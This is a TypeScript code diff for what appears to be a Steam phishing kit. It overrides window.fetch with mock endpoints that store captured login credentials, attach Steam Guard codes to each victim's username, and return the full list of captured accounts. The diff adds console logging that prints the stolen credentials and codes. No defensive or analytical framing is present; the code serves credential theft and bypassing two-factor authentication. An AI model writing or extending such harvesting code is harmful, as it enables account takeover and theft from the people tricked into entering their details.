@@ -16,20 +16,31 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
   
   // Handle different endpoints
   if (endpoint === '/api/store-credentials') {
-    const data = JSON.parse(options.body as string);
-    capturedCredentials.push({
-      ...data,
-      id: Date.now().toString(),
-      timestamp: new Date().toISOString(),
-      status: 'pending'
-    });
-    return { success: true };
+    console.log("Storing credentials:", options.body);
+    try {
+      const data = JSON.parse(options.body as string);
+      const newCredential = {
+        ...data,
+        id: Date.now().toString(),
+        timestamp: new Date().toISOString(),
+        status: 'pending'
+      };
+      capturedCredentials.push(newCredential);
+      console.log("Credentials stored successfully:", newCredential);
+      console.log("All credentials:", capturedCredentials);
+      return { success: true };
+    } catch (error) {
+      console.error("Error storing credentials:", error);
+      return { success: false, error: "Failed to parse credentials" };
+    }
   }
   
   if (endpoint === '/api/store-steamguard') {
     const data = JSON.parse(options.body as string);
     const code = data.code;
     const username = data.username;
+    
+    console.log("Storing Steam Guard code for user:", username, "code:", code);
     
     // Find the credential with the matching username and update it
     capturedCredentials = capturedCredentials.map(cred => {
@@ -43,6 +54,7 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
       return cred;
     });
     
+    console.log("Updated credentials after Steam Guard:", capturedCredentials);
     return { success: true };
   }
   
@@ -61,6 +73,7 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
   }
   
   if (endpoint === '/api/get-credentials') {
+    console.log("Returning credentials:", capturedCredentials);
     return capturedCredentials;
   }
   
@@ -95,7 +108,9 @@ window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
   // Only intercept API calls
   if (url.startsWith('/api/')) {
     try {
+      console.log(`Intercepted API call to ${url}`);
       const response = await handleApiRequest(url, init);
+      console.log(`API response for ${url}:`, response);
       return {
         ok: true,
         status: 200,
@@ -103,6 +118,7 @@ window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
         text: async () => JSON.stringify(response)
       } as Response;
     } catch (error) {
+      console.error(`Error handling API call to ${url}:`, error);
       return {
         ok: false,
         status: 500,
